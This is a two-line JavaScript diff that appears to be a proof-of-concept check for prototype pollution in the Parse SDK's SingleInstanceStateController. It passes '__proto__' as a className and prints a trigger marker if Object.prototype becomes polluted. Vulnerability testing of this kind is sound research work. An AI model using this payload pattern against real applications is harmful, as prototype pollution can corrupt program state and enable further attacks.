@@ -1,0 +1,2 @@
+require("parse/lib/browser/SingleInstanceStateController").initializeState({ className: '__proto__', id: 'pollutedProperty'}, {});
+console.log({}.pollutedProperty !== undefined ? '[POLLUTION_TRIGGERED]':'');
